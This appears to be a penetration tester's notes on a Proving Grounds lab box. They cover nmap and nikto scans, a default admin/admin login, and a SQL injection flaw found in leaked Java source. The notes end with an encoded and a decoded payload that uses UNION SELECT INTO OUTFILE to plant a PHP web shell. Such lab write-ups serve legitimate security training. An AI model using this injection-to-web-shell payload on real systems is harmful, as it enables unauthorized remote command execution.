---
tags: [ProvingGround]
---

Hawat 5/27/25

-------------------------

## 1.  sudo nmap -p- -sC -sV -Pn -n --open 192.168.189.147 -oN nmap/initial
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open  http    Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Issue Tracker
30455/tcp open  http    nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
| http-methods:
|_  Potentially risky methods: TRACE
## 2. Ran  nikto -h on each open http port. Interesting things on each

17455
/js/editor/fckeditor/editor/filemanager/upload/test.html: Uncommon header 'content-disposition' found, with contents: inline;filename=f.txt.
/Gp4DicAJ.bat|dir: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/


30455
+ /phpinfo.php: Output from the phpinfo() function was found.
^[[1;5C+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.


50800
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /cloud/status.php: Retrieved x-powered-by header: PHP/7.4.15.
+ /cloud/status.php: Retrieved access-control-allow-origin header: *.


## 3. When going to http://192.168.189.147:50080/cloud/ redirected to http://192.168.189.147:50080/cloud/index.php/login
## 4. Guessed login as admin/admin
## 5. On 192.168.189.147:30455/phpinfo.php

Server doument root is /srv/http

## 6. Found source code for Issue Tracker (192.168.189.147:17455) called issuetracker.zip
## 7. Found the following code indicating a sql injection vulnerability:

@GetMapping("/issue/checkByPriority")

String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
System.out.println(query);

## 8. POST /issue/checkByPriority?priority=High%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%22%63%6d%64%22%5d%29%3b%20%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%73%72%76%2f%68%74%74%70%2f%73%68%65%6c%6c%2e%70%68%70%27%20%2d%2d%20%2d

' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
